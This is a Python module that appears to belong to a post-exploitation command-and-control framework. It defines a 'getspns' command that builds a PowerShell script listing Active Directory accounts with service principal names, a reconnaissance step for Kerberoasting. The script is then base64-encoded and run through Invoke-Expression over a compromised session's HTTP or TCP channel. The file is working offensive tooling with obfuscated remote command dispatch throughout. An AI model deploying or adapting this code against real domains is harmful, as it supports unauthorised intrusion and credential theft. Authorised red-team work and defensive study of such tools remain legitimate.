import argparse
import base64
import os
import sys

from core.gunnershell.commands.base import register, Command, connection_builder
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("getspns")
class GetSPNsCommand(Command):
	"""List or dump all accounts that have SPNs registered."""

	@property
	def help(self):
		return "getspns [-d <domain>] [--dc-ip <ip>]"

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="getspns", add_help=False)
		parser.add_argument("-d","--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
		parser.add_argument("--dc-ip",      dest="dc_ip",  required=False, help="IP address of the Domain Controller")

		try:
			opts = parser.parse_args(args)

		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			sid    = self.gs.sid,
			domain = opts.domain,
			dc_ip  = opts.dc_ip,
			op_id  = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightred + "[!] No output")

	def logic(self, sid, domain=None, dc_ip=None, hashes=None, op_id="console"):
		"""
		getspns [-d <domain>] [--dc-ip <ip>]
		- No flags: lists every account (user or computer) that has one or more SPNs.
		- -d, --domain: target a specific AD domain.
		- --dc-ip:      target a specific DC by IP.
		"""
		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"
		transport = sess.transport.lower()

		# Resolve target DC/domain
		target = dc_ip or domain or None
		if target:
			dns_preamble = connection_builder(dc_ip, domain)
			if dns_preamble == "ERROR":
				return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"
			server_arg = "-Server $nb"
			root       = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"
			spn_cmd = f"$spnfound = (Get-ADObject -Filter \"servicePrincipalName -like '*'\" {server_arg} -Properties servicePrincipalName,SamAccountName | Select-Object SamAccountName,servicePrincipalName)"
			all_cmd = f"$all = Get-ADObject -Filter \"servicePrincipalName -like '*'\" {server_arg} -Properties servicePrincipalName,SamAccountName"
		else:
			dns_preamble = ""
			server_arg   = ""
			root         = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"
			spn_cmd = f"$spnfound = (Get-ADObject -Filter \"servicePrincipalName -like '*'\" -Properties servicePrincipalName,SamAccountName | Select-Object SamAccountName,servicePrincipalName)"
			all_cmd = "$all = Get-ADObject -Filter \"servicePrincipalName -like '*'\" -Properties servicePrincipalName,SamAccountName"


		ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADObject -ErrorAction SilentlyContinue) {{
	  {spn_cmd}
	  [object[]]$results = @()
	  Write-Host $spnfound
	  if ($spnfound) {{
		foreach ($s in $spnfound) {{
		  foreach ($n in $s.SamAccountName) {{
			$name = ('{{0}}' -f $($n))
			$clean = [Regex]::Escape($name)
			foreach ($r in $s.servicePrincipalName) {{
			  Write-Output ("{{0}} -> {{1}}" -f $($clean), $($r))
			}}
		  }}
		}}
	  }} else {{ Write-Output "Nothing Found" }}

  }} else {{
	  {root}
	  $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(servicePrincipalName=*)")
	  $searcher.PageSize = 1000
	  $results = $searcher.FindAll()
	  foreach ($r in $results) {{
		$name = $r.Properties["sAMAccountName"][0]
		$clean = [Regex]::Escape($name)
		foreach ($spn in $r.Properties["serviceprincipalname"]) {{
		  Write-Output ("{{0}} -> {{1}}" -f $clean, $spn)
		}}
	  }}
  }}
}} catch {{
  {root}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(servicePrincipalName=*)")
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
	$name = $r.Properties["sAMAccountName"][0]
	$clean = [Regex]::Escape($name)
	foreach ($spn in $r.Properties["serviceprincipalname"]) {{
	  Write-Output ("{{0}} -> {{1}}" -f $clean, $spn)
	}}
  }}
}}
"""

		# Base64‑encode & dispatch
		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"" + b64 + "\"));"
			"Invoke-Expression $ps"
		)

		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		if out:
			if "Failed to resolve DC!" in out:
				return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"

			elif "Nothing Found" in out:
				return brightred + "[!] No SPNs found!"

			else:
				out = out.replace("\\", "").replace("\\\\", "").replace("\\\\\\\\", "")
				return out